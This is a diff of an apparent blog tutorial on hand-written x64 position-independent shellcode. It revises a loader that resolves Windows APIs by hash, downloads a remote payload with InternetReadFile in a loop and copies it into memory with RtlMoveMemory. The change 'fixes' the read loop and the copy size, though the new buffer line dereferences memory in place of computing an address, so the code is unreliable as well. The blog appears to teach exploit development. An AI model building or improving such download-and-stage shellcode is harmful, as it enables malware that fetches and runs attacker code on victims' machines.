@@ -531,7 +531,7 @@ api5 dd 0xC7DEFE95  ;rtlmovememory
 api7 dd 0xE536B693  ; getprocaddress
 ```
 
-Ok so now it's time dive into the full, revised assembly code.  This time around, we will be producing the PIC formatted assembly code.  I'll try and provide comments throughout but I promise to go into even greater detail in my soon to be x64 Assembly/Shellcode video series.  It will be a purchaseable item in my ko-fi shop once it's ready.  Ok let's start laying this code out.  I'll be going over it in segments because there's a lot to cover.  See my comments inline below:
+Ok so now it's time dive into the full, revised assembly code.  This time around, we will be producing the PIC formatted assembly code.  I'll try and provide comments throughout but I promise to go into even greater detail in my soon to be x64 Assembly/Shellcode video series.  It will be a purchaseable item in my ko-fi shop once it's ready.  Ok let's start laying this code out.  I'll be going over it in segments because there's a lot to cover.  I corrected an issue with the loop code in the earlier examples by the way, so the read file loop will look a bit different in the PIC code.  Just FYI. See my comments inline below:
 
 ```nasm
 ;nasm -fwin64 [x64findkernel32.asm]
@@ -869,26 +869,28 @@ The remainder of the code I'm just going to paste here and let you walk through 
     add rsp, 0x28
     push rax                       ; hUrl
     mov rsi, [rsp]                 ; hUrl handle for closing
+
+xor rbx, rbx
 read_loop:
     ; ---- InternetReadFile ----
     mov rcx, [rsp]                   ; HINTERNET hUrl
-    mov rdx, r15                  ; LPVOID lpBuffer
+    mov rdx, [r15+rbx]                  ; LPVOID lpBuffer
     mov r8d, 4096                     ; DWORD dwNumberOfBytesToRead
-    lea r9, dword [rsp-0x30]               ; LPDWORD lpdwNumberOfBytesRead
+    lea r9, dword [rsp+0x40]               ; LPDWORD lpdwNumberOfBytesRead
     xor rax, rax
     call r13
-    test eax, eax
+    test eax, eax                    ; Check if InternetReadFile succeeded
     je read_done
-    cmp dword [rsp-0x30], 0
-    jbe read_done
     
-
-    mov ecx, dword [rsp-0x30]        ; load the DWORD from [r9] into ECX (the total bytes for our shellcode!)
-    mov [rsp-0x40], ecx             ; store that value into totalBytes
-
+    mov ecx, dword [rsp+0x40]        ; Bytes read THIS iteration
+    test ecx, ecx                    ; Check if 0 bytes (EOF)
+    jz read_done
+    
+    add rbx, rcx                     ; Accumulate total bytes
     jmp read_loop
-
+    
 read_done:
+    mov [rsp-0x50], ebx              ; Store total bytes downloaded
 ; ---- Close handles ----
     mov rcx, rsi ;hUrl
     call r12
@@ -909,7 +911,7 @@ read_done:
     ; Example: single chunk
     pop rcx                      ; destination
     mov rdx, r15                 ; source
-    mov r8d, 1000                  ; size
+    mov r8d,  dword [rsp-0x10]                  ; size
     mov rax, [rsp + 21*8]
     call rax                     ;RtlMoveMemory
     push rax
